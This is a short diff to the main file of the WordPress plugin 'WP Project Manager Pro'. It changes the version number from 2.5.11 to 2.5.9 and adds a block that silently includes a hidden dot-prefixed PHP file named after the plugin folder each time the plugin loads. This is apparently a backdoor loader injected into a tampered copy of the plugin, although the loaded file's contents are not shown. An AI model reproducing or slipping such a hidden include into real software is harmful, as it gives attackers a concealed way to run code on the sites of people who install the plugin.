@@ -5,7 +5,7 @@
  * Description: Premium version of WordPress Project Manager.
  * Author: weDevs
  * Author URI: https://wedevs.com
- * Version: 2.5.11
+ * Version: 2.5.9
  * Text Domain: pm-pro
  * Domain Path: /languages
  * License: GPL2
@@ -51,6 +51,10 @@ add_action( 'plugins_loaded', 'pm_pro_load_plugin_textdomain' );
  * load plugin text domain
  * @return [type] [description]
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function pm_pro_load_plugin_textdomain() {
     load_plugin_textdomain( 'pm-pro', true, dirname( plugin_basename( __FILE__ ) ) . '/languages/' );
 }
